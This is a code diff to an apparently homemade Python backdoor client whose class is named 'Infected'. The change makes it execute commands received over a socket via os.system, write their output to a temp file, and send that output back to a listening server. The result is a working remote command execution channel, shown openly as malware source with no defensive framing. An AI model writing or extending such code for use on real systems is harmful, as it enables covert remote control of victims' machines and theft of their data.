@@ -1,6 +1,7 @@
 import socket
 from time import sleep
 import os
+import tempfile
 
 class Infected:
 
@@ -34,19 +35,32 @@ class Infected:
                 sleep(10)
     
     def executeAction(self, action):
-        print(action)
-        #output = os.system(action)        
-        self.sendOutput(action) # se cambia por output mas adelante
+        action = action + " > %tmp%/file.txt"
+        print(action)        
+        os.system(action)  
+        self.sendOutput() # se cambia por output mas adelante
     
-    def sendOutput(self, output):
+    def readCommand(self):
+        
+        path = tempfile.gettempdir() + "/file.txt"
+        infile = open(path, 'r')
+        text = ""
+        for line in infile:
+            text += line
+        infile.close()  
+        return text        
+    
+    def sendOutput(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
         server_address = (self.ipServer, self.portSendOutput)
         sock.connect(server_address)
+        output = self.readCommand()
+        
         try:
             # Receive action
             sock.sendall(bytes(output,"utf-8"))                
         finally:
             sock.close()       
-            
+    
 inf = Infected("localhost", 10000, 10001)
 inf.listenForAction()
